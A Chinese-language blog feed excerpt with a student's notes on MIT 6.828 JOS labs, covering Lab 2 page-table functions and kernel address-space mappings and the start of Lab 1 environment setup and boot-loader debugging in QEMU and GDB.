<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">           Selector  +--------------+         +-----------+</div><div class="line">          ----------&gt;|              |         |           |</div><div class="line">                     | Segmentation |         |  Paging   |</div><div class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</div><div class="line">            Offset   |  Mechanism   |         | Mechanism |</div><div class="line">          ----------&gt;|              |         |           |</div><div class="line">                     +--------------+         +-----------+</div><div class="line">            Virtual                   Linear                Physical</div></pre></td></tr></table></figure>
<p> C 指针是虚拟地址的偏移部分。在 <code>boot/boot.S</code>中，引入全局描述符表(GDT)将所有段基址设为0到 0xffffffff。因此线性地址等于虚拟地址的偏移量。</p>
<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>在QEMU中使用 xp 可以查看物理内存，PD虚拟机对于lab手册上调出QEMU monitor的方法没用，通过查资料发现使用这个也能查看 <code>qemu-system-i386 -hda obj/kern/kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log</code>。</p>
<p>在QEMU monitor中使用 <code>info pg</code> 查看当前页表， <code>info mem</code> 查看虚拟内存的范围。</p>
<p>进入保护模式以后，所有地址引用都是虚拟地址，由MMU转换，也就是说 C 指针都是虚拟地址。</p>
<p>JOS内核经常需要操作地址通过整数而不解引用。JOS为了区分两种情况：类型 uintptr_t 代表虚拟地址，physaddr_t 代表物理地址。虽然都是32位整数，但是不能直接解引用，需要先转型。</p>
<p>JOS需要读取或修改内存，尽管只知道物理地址。给页表添加映射需要分配无力内存去储存一个页目录，然后才能初始化内存。然而内核不能绕过虚拟地址转换，因此不能直接加载和储存物理地址。为了将物理地址转为虚拟地址，内核需要在物理地址加上0xf0000000从而找到相关的虚拟地址，可以使用KADDR(pa)完成这个操作。</p>
<p>同样，如果内核需要通过虚拟地址去找物理地址，就需要减去0xf0000000，可以使用PADDR(va)完成这个操作。</p>
<h3 id="u5F15_u7528_u8BA1_u6570"><a href="#u5F15_u7528_u8BA1_u6570" class="headerlink" title="引用计数"></a>引用计数</h3><p>之后实验经常需要将多个虚拟地址同时映射到同一块物理页上，因此需要给每一个物理页计数引用次数，这个值位于物理页 struct PageInfo 中的 pp_ref 字段中。</p>
<h3 id="u9875_u8868_u7BA1_u7406"><a href="#u9875_u8868_u7BA1_u7406" class="headerlink" title="页表管理"></a>页表管理</h3><p>完成页表管理：插入删除线性到物理地址的映射和创建页表。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现<code>kern/pmap.c</code>里的pgdir_walk()，boot_map_region()，page_lookup()，page_remove()，page_insert()这几个函数。check_page()会测试是否写的正确。</p>
<p>首先是 pgdir_walk()，参考注释可以得知，这个函数获得指向线性地址页表项的指针，传入的参数是页目录指针，线性地址和另外一个参数。</p>
<p><img src="2.png" alt=""></p>
<p>由上面的图可以知道二级分页模式下线性地址到物理地址的转换。所以首先要获得页目录地址，判断是否指向的页表项存在，不存在则新建一个页表。这里有两个注意点。第一个地方是要注意判断页表是否存在，根据下图页目录/表的结构，可以知道这里的P位代表Present，用来判断对应的物理页是否存在，存在则为1，所以通过与运算来判断。</p>
<p><img src="3.png" alt=""></p>
<p>另外一个注意点是新建页。为新建的物理页设置页目录时，需要添加上权限位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">pte_t *</div><div class="line">pgdir_walk(pde_t *pgdir, const void *va, int create)</div><div class="line">&#123;</div><div class="line">	// Fill this function in</div><div class="line">	pde_t *pt = pgdir + PDX(va);</div><div class="line">	pde_t *pt_addr_v;</div><div class="line">	</div><div class="line">	if (*pt &amp; PTE_P) &#123;</div><div class="line">		pt_addr_v = (pte_t *)KADDR(PTE_ADDR(*pt));</div><div class="line">		return pt_addr_v + PTX(va);</div><div class="line">	&#125; else &#123;</div><div class="line">		struct PageInfo *newpt;</div><div class="line">		if (create == 1 &amp;&amp; (newpt = page_alloc(ALLOC_ZERO)) != 0) &#123;</div><div class="line">			memset(page2kva(newpt), 0, PGSIZE);</div><div class="line">			newpt-&gt;pp_ref ++;</div><div class="line">			*pt = PADDR(page2kva(newpt))|PTE_U|PTE_W|PTE_P;</div><div class="line">			pt_addr_v = (pte_t *)KADDR(PTE_ADDR(*pt));</div><div class="line">			return pt_addr_v + PTX(va);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接着是boot_map_region函数，这个函数将虚拟地址[va, va+size)映射到物理地址[pa, pa+size)，注释中提到可以使用上面写的pgdir_walk，获取页表地址，接着将物理地址的值与上权限位赋给页表地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line">boot_map_region(pde_t *pgdir, uintptr_t va, size_t size, physaddr_t pa, int perm)</div><div class="line">&#123;</div><div class="line">	// Fill this function in</div><div class="line">	int offset;</div><div class="line">	pte_t *pt;</div><div class="line">	for (offset = 0; offset &lt; size; offset += PGSIZE) &#123;</div><div class="line">		pt = pgdir_walk(pgdir, (void *)va, 1);</div><div class="line">		*pt = pa|perm|PTE_P;</div><div class="line">		pa += PGSIZE;</div><div class="line">		va += PGSIZE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后是page_lookup函数，查找线性地址va对应的物理页面，找到就返回这个物理页，否则返回NULL。首先如果pte_store非0，则储存这个页的页表地址，这一步是为了之后的page_remove用的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">struct PageInfo *</div><div class="line">page_lookup(pde_t *pgdir, void *va, pte_t **pte_store)</div><div class="line">&#123;</div><div class="line">	// Fill this function in</div><div class="line">	pte_t *pte = pgdir_walk(pgdir, va, 0);</div><div class="line">	if (pte_store != 0) &#123;</div><div class="line">		*pte_store = pte;</div><div class="line">	&#125;</div><div class="line">	if (pte != NULL &amp;&amp; (*pte &amp; PTE_P)) &#123;</div><div class="line">		return pa2page(PTE_ADDR(*pte));</div><div class="line">	&#125;</div><div class="line">	return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>page_remove函数算是比较容易的，参考注释里的提示，先通过page_lookup获得物理页，如果存在则执行删除工作page_decref，同时也要将va地址的页表项设为0，最后就是验证有效性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">page_remove(pde_t *pgdir, void *va)</div><div class="line">&#123;</div><div class="line">	// Fill this function in</div><div class="line">	pte_t *pte;</div><div class="line">	struct PageInfo *page = page_lookup(pgdir, va, &amp;pte);</div><div class="line">	if (page) &#123;</div><div class="line">		page_decref(page);</div><div class="line">		*pte = 0;</div><div class="line">		tlb_invalidate(pgdir, va);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后一步就是page_insert函数，将页面管理结构 pp 所对应的物理页面分配给线性地址 va。同时,将对应的页表项的 permission 设置成 PTE_P&amp;perm。 注意:一定要考虑到线性地址 va 已经指向了另外一个物理页面或者干脆就是这个函数要指向的物理页面的情况。如果线性地址 va 已经指向了另外一个物理页面,则先要调用 page_remove 将该物理页从线性地址 va 处删除,再将 va 对应的页表项的地址赋值为 pp 对应 的物理页面。如果 va 指向的本来就是参数 pp 所对应的物理页面,则将 va 对应的页表项中 的物理地址赋值重新赋值为 pp 所对应的物理页面的首地址即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">page_insert(pde_t *pgdir, struct PageInfo *pp, void *va, int perm)</div><div class="line">&#123;</div><div class="line">	// Fill this function in</div><div class="line">	pte_t *pte = pgdir_walk(pgdir, va, 1);</div><div class="line">	if (!pte) &#123;</div><div class="line">		return -E_NO_MEM;</div><div class="line">	&#125;  </div><div class="line">	if (*pte &amp; PTE_P) &#123;</div><div class="line">		if (PTE_ADDR(*pte) == page2pa(pp)) &#123;</div><div class="line">			tlb_invalidate(pgdir, va);</div><div class="line">			pp-&gt;pp_ref--;</div><div class="line">		&#125;</div><div class="line">		else &#123;</div><div class="line">			page_remove(pgdir, va);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	*pte = page2pa(pp) | perm | PTE_P;</div><div class="line">	pp-&gt;pp_ref++;</div><div class="line">	pgdir[PDX(va)] |= perm;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="Part 3: 内核地址空间"></a>Part 3: 内核地址空间</h2><h3 id="u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206"><a href="#u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206" class="headerlink" title="线性地址的两部分"></a>线性地址的两部分</h3><p>JOS将处理器32位线性地址划分为占低地址的用户环境(进程)和占高地址的内核。 分界线是<code>inc/memlayout.h</code>中的变量 ULIM。内核保留了大约256MB的虚拟地址空间，lab1中内核设在那么高的地址就是因为要留一部分空间给用户环境。</p>
<h3 id="u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB"><a href="#u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB" class="headerlink" title="访问权限和故障隔离"></a>访问权限和故障隔离</h3><p>内核和用户内存都在各自的环境地址空间中，必须在x86页表中使用访问权限位(Permissions bits)来使用户代码只访问用户的地址空间，否则用户的代码bug会覆盖内核数据，造成系统崩溃。值得注意的是可写权限位(PTE_W)可以同时影响用户和内核代码。 </p>
<p>高于ULIM的内存内核可以读写，而用户环境没有权限。内核和用户在地址[UTOP,ULIM)有同样的权限：可读但不可写，这部分地址空间通常是一些特定的内核数据，让用户环境可以读取。最后，地址UTOP之下的是用户环境。</p>
<h3 id="u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="初始化内核地址空间"></a>初始化内核地址空间</h3><p>设置UTOP之上的地址空间。在<code>inc/memlayout.h</code>中显示了布局。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>完成mem_init()中缺少的部分。</p>
<p>因为mem_init开头创建了初始化页目录kern_pgdir，首先是将pages数组映射到线性地址UPAGES，权限是内核只读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages),PTE_U);</div></pre></td></tr></table></figure>
<p>接着是映射物理地址到内核栈，也就是从地址范围[KSTACKTOP-KSTKSIZE, KSTACKTOP)映射到bootstack开始的物理地址页上，注释中提到了，只要映射[KSTACKTOP-KSTKSIZE, KSTACKTOP)， [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE)不映射，权限位是内核读写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">boot_map_region(kern_pgdir, KSTACKTOP-KSTKSIZE, KSTKSIZE, PADDR(bootstack), PTE_W);</div></pre></td></tr></table></figure>
<p>最后是映射虚拟地址[KERNBASE, 2^32)到物理地址[0, 2^32 - KERNBASE)，权限位是内核读写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">boot_map_region(kern_pgdir, KERNBASE, (0xffffffff-KERNBASE), 0, PTE_W);</div></pre></td></tr></table></figure>
<p>这时候运行<code>grade-lab2</code>应该是拿到了全部分数。</p>
<p><img src="4.png" alt=""></p>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><p>2.填写这个页目录，可以参考<code>inc/memlayout.h</code></p>
<pre><code>| Entry | Base Virtual Address |  Points to (logically):  |
| ----- | -----:   | :----: |
|  1023 | 0xffc00000  |   Page table for top 4MB of phys memory   |
|  1022 | 0xff800000  |   .    |
|   .   |      .      |   .    |
|  960  | 0xf0000000  |   KERNBASE |
|   .   |      .      |   .    |
|   2   | 0x00800000  |   Program Data &amp; Heap     |
|   1   | 0x00400000  |   Empty Memory (*)    |
|   0   | 0x00000000  |   Empty Memory    | 
</code></pre><p>3.为什么用户不能改内核代码？因为没有权限。</p>
<p>其他问题有点不确定思路，先放着吧。</p>
<h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>添加一个显示页映射的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">int mon_showmappings(int argc, char **argv, struct Trapframe *tf)</div><div class="line">&#123;</div><div class="line">	extern pte_t *pgdir_walk(pde_t *pgdir, const void *va, int create);</div><div class="line">	extern pde_t *kern_pgdir;</div><div class="line"></div><div class="line">	if (argc != 3) &#123;</div><div class="line">        cprintf(&quot;Usage: showmappings 0xbegin_addr 0xend_addr\n&quot;);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    long begin = strtol(argv[1], NULL, 16);</div><div class="line">    long end = strtol(argv[2], NULL, 16);</div><div class="line">    if (end &lt;= begin) &#123;</div><div class="line">    	cprintf(&quot;end_addr must larger than begin_addr\n&quot;);</div><div class="line">    	return 0;</div><div class="line">    &#125;</div><div class="line">    if (end &gt; 0xffffffff) &#123;</div><div class="line">    	cprintf(&quot;end_addr overflow\n&quot;);</div><div class="line">    	return 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (begin != ROUNDUP(begin, PGSIZE) || end != ROUNDUP(end, PGSIZE))</div><div class="line">    &#123;</div><div class="line">    	cprintf(&quot;not aligned\n&quot;);</div><div class="line">    	return 0;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    for (; begin &lt; end; begin+=PGSIZE) &#123;</div><div class="line">    	cprintf(&quot;%08x--%08x: &quot;, begin, begin+PGSIZE);</div><div class="line">    	pte_t *pte = pgdir_walk(kern_pgdir, (void*)begin, 0);</div><div class="line">    	if (!pte)</div><div class="line">    	&#123;</div><div class="line">    		cprintf(&quot;not mapped\n&quot;);</div><div class="line">    		return 0;</div><div class="line">    	&#125;</div><div class="line">    	cprintf(&quot;page %08x &quot;, PTE_ADDR(*pte));</div><div class="line">    	cprintf(&quot;PTE_P: %x, PTE_W: %x, PTE_U: %x\n&quot;, *pte&amp;PTE_P, *pte&amp;PTE_W, *pte&amp;PTE_U);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="u5730_u5740_u7A7A_u95F4_u5E03_u5C40"><a href="#u5730_u5740_u7A7A_u95F4_u5E03_u5C40" class="headerlink" title="地址空间布局"></a>地址空间布局</h3><p>地址空间布局可以有多种，x86的模式是为了向后兼容。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这个lab更多的是动手写代码，分页机制在计算机组成原理曾经讲过一部分，然而如今已经忘了，做这个lab还要配合CSAPP，总之通过看了很多文章，终于依葫芦画瓢的把这个lab给结束掉了。</p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter4.pdf" target="_blank" rel="external">第四章.内存管理(lab2)(v0.1)</a></p>
<p><a href="https://github.com/Clann24/jos/tree/master/lab2" target="_blank" rel="external">Clann24/jos</a></p>
]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 1</title>
    <link href="http://xinqiu.me/2016/10/15/MIT-6.828-1/"/>
    <id>http://xinqiu.me/2016/10/15/MIT-6.828-1/</id>
    <published>2016-10-14T16:00:00.000Z</published>
    <updated>2017-02-02T09:15:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>MIT 6.828 算是操作系统的经典课程，其中要求完成一个JOS的操作系统。在这之前，需要完成一些环境的安装。</p>
<a id="more"></a>
<h2 id="u524D_u671F_u51C6_u5907"><a href="#u524D_u671F_u51C6_u5907" class="headerlink" title="前期准备"></a>前期准备</h2><p>我的系统是Ubuntu 14.04 64位，在虚拟机中运行的。在Lab 1中提到了安装实验的方法。考虑到国内的网络情况，建议使用ss配合proxychains在终端中使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://pdos.csail.mit.edu/6.828/2016/jos.git lab</div></pre></td></tr></table></figure>
<p>如果直接make可能会出现<code>undefined reference to &#39;__udivdi3&#39;</code>的问题，解决方案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install gcc-multilib</div></pre></td></tr></table></figure>
<p>如果没装qemu，这里需要安装qemu，在课程的Tools页面中，提到了QEMU最好安装修改版，考虑到<code>git clone http://web.mit.edu/ccutler/www/qemu.git -b 6.828-2.3.0</code>这个不好clone，建议使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/geofft/qemu.git -b 6.828-2.3.0</div></pre></td></tr></table></figure>
<p>在执行 <code>./configure --disable-kvm [--prefix=PFX] [--target-list=&quot;i386-softmmu x86_64-softmmu&quot;]</code> （PFX为安装路径，可以省略）<br>时，可能会出现几种情况：</p>
<ol>
<li>ERROR: zlib check failed<pre><code>Make sure to have the zlib libs and headers installed.
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install zlib1g-dev</code></p>
<ol>
<li>ERROR: glib-2.12 gthread-2.0 is required to compile QEMU</li>
</ol>
<p>解决: <code>sudo apt-get install libglib2.0-dev</code></p>
<ol>
<li>ERROR: pixman &gt;= 0.21.8 not present. Your options:<pre><code>(1) Preferred: Install the pixman devel package (any recent
    distro should have packages as Xorg needs pixman too).
(2) Fetch the pixman submodule, using:
    git submodule update --init pixman
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install libpixman-1-dev</code></p>
<p>还有一个找了很久解决方案的错误:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vl.c: In function ‘main’:vl.c:2778:5: error: ‘g_mem_set_vtable’ is deprecated [-Werror=deprecated-declarations]     g_mem_set_vtable(&amp;mem_trace);     ^In file included from /usr/include/glib-2.0/glib/glist.h:32:0,                 from /usr/include/glib-2.0/glib/ghash.h:33,                 from /usr/include/glib-2.0/glib.h:50,                 from vl.c:59:/usr/include/glib-2.0/glib/gmem.h:357:7: note: declared here void  g_mem_set_vtable (GMemVTable *vtable);       ^cc1: all warnings being treated as errorsrules.mak:57: recipe for target &apos;vl.o&apos; failedmake: *** [vl.o] Error 1</div></pre></td></tr></table></figure>
<p>其实解决起来很简单，在Makefile文件最后加上一行 <code>QEMU_CFLAGS+=-w</code> 就可以了。 </p>
<p>之后运行 <code>make &amp;&amp; make install</code> ,这里可能会出现一个权限不够的坑，建议先提权 <code>sudo -s</code>。<br>至此，<code>make</code>会出现：</p>
<p><img src="1.png" alt=""></p>
<p>生成了一个 <code>kernel.img</code> 的镜像，执行 <code>make qemu</code> 就会用 qemu 去运行这个镜像</p>
<p><img src="2.png" alt=""></p>
<p>倒是我这里没看到’Booting from Hard Disk…’，另外前面还有一堆信息。输入 <code>help</code> 和 <code>kerninfo</code> 都有正常信息出现，所以应该环境什么应该算是搭建好了。</p>
<h2 id="Part_1_3A_PC_Bootstrap"><a href="#Part_1_3A_PC_Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="PC_u7269_u7406_u5730_u5740_u7A7A_u95F4"><a href="#PC_u7269_u7406_u5730_u5740_u7A7A_u95F4" class="headerlink" title="PC物理地址空间"></a>PC物理地址空间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</div><div class="line">|      32-bit      |</div><div class="line">|  memory mapped   |</div><div class="line">|     devices      |</div><div class="line">|                  |</div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line"></div><div class="line">/\/\/\/\/\/\/\/\/\/\</div><div class="line">|                  |</div><div class="line">|      Unused      |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- depends on amount of RAM</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">| Extended Memory  |</div><div class="line">|                  |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00100000 (1MB)</div><div class="line">|     BIOS ROM     |</div><div class="line">+------------------+  &lt;- 0x000F0000 (960KB)</div><div class="line">|  16-bit devices, |</div><div class="line">|  expansion ROMs  |</div><div class="line">+------------------+  &lt;- 0x000C0000 (768KB)</div><div class="line">|   VGA Display    |</div><div class="line">+------------------+  &lt;- 0x000A0000 (640KB)</div><div class="line">|                  |</div><div class="line">|    Low Memory    |</div><div class="line">|                  |</div><div class="line">+------------------+  &lt;- 0x00000000</div></pre></td></tr></table></figure>
<p>早期基于16位Intel 8088处理器只能操作1MB物理内存，因此物理地址空间起始于0x00000000到0x000FFFFF，其中640KB为 Low memory，这只能被随机存储器(RAM)使用。</p>
<p>从 0x000A0000 到 0x000FFFFF 的384KB留着给特殊使用，例如作为视频显示缓存或者储存在非易失存储器的硬件。从 0x000F0000 到 0x000FFFFF 占据64KB区域的部分是最重要的BIOS。BIOS的功能这里就不细说了。</p>
<p>现在的x86处理器支持超过4GB的物理RAM，所以RAM扩展到了0xFFFFFFFF。当然，BIOS也流出了开始的32位寻址空间为了让32位的设备映射。JOS这里只用开始的256MB，所以假设PC只有32位地址空间。</p>
<h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p>在一个终端中输入 <code>make qemu-gdb</code> ， 另一个终端输入 <code>make gdb</code> 。开始调试程序。</p>
<p><code>[f000:fff0] 0xffff0:    ljmp   $0xf000,$0xe05b</code></p>
<p>是GDB反汇编出的第一条执行指令，这条指令表面了：</p>
<ul>
<li>IBM PC 执行的起始物理地址为 0x000ffff0</li>
<li>PC 的偏移方式为 CS = 0xf000，IP = 0xfff0</li>
<li>第一条指令执行的是 jmp指令，跳转到段地址  CS = 0xf000，IP = 0xe05b</li>
</ul>
<p>QEMU模拟了8088处理器的启动，当启动电源，BIOS最先控制机器，这时还没有其他程序执行，之后处理器进入实模式也就是设置 CS 为 0xf000，IP 为 0xfff0。在启动电源也就是实模式时，地址转译根据这个公式工作：物理地址 = 16 * 段地址 + 偏移量。所以 PC 中 CS 为 0xf000 IP 为 0xfff0 的物理地址为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">16 * 0xf000 + 0xfff0   # 十六进制中乘16很容易</div><div class="line">= 0xf0000 + 0xfff0     # 仅仅添加一个0.</div><div class="line">= 0xffff0</div></pre></td></tr></table></figure>
<p>0xffff0 在 BIOS (0x100000) 的结束地址之前。</p>
<p>当BIOS启动，它设置了一个中断描述符表并初始化多个设备比如VGA显示器。在初始化PCI总线和所有重要的设备之后，它寻找可引导的设备，之后读取 <em>boot loader</em> 并转移控制。</p>
<h2 id="Part_2_3A_The_Boot_Loader"><a href="#Part_2_3A_The_Boot_Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>接下来是512 byte区域的扇区，它是硬盘最小调度单位，每次读或写操作都至少是一个扇区，并且还会进行对齐。BIOS加载引导扇区到内存中是从物理地址0x7c00到0x7dff，然后使用jmp指令设置 CS:IP 为 0000:7c00。因此 boot loader 不能超过512字节，它执行两个功能：</p>
<ol>
<li><p>boot loader 切换处理器从实模式到保护模式，只有这样才能访问大于1MB的物理地址空间。</p>
</li>
<li><p>boot loader 从硬盘中读取内核。</p>
</li>
</ol>
<h3 id="u52A0_u8F7DBoot"><a href="#u52A0_u8F7DBoot" class="headerlink" title="加载Boot"></a>加载Boot</h3><h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>通过 <code>b *0x7c00</code> 设置断点，接着 <code>c</code> 运行到断点处，使用 <code>x/i</code> 来查看当前的指令。</p>
<ul>
<li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? 在哪执行了32位代码？</p>
<p>  <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x7c32</code> 这条指令之后，也就是 <code>boot.S</code> 中的 <code>ljmp $PROT_MODE_CSEG, $protcseg</code> ，地址符号就变成 0x7c32 了。</p>
</li>
<li><p>What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded?最后一条 boot loader 指令，第一条内核指令？</p>
<p>  boot loader 最后一步是加载kernel，所以在 <code>boot/main.c</code> 中可以找到 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 这行代码，上面的注释 <code>call the entry point from the ELF header</code> 表明这是准备读取ELF头。<br>  通过 <code>objdump -x obj/kern/kernel</code> 可以查看kernel的信息，其中开头就有 <code>start address 0x0010000c</code>，通过 <code>b *0x10000c</code>然后在 <code>c</code> 能得到执行的指令是 <code>movw   $0x1234,0x472</code>，当然在 <code>kern/entry.S</code> 中也能找到这个指令。</p>
</li>
<li><p>Where is the first instruction of the kernel?</p>
<p>  同上一条的问题，存在kern/entry.S中。</p>
</li>
</ul>
<ul>
<li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? </p>
<p>  关于查看kernel信息的，通过 <code>objdump -h obj/kern/kernel</code> 可以得出相关信息。</p>
</li>
</ul>
<p>接下来就可以来完成 Exercise 3。设置一个断点在地址0x7c00处，这是boot sector被加载的位置。然后让程序继续运行直到这个断点。跟踪<code>/boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的x/i指令来获取去任意一个机器指令的反汇编指令，把源文件<code>boot.S</code>文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p>
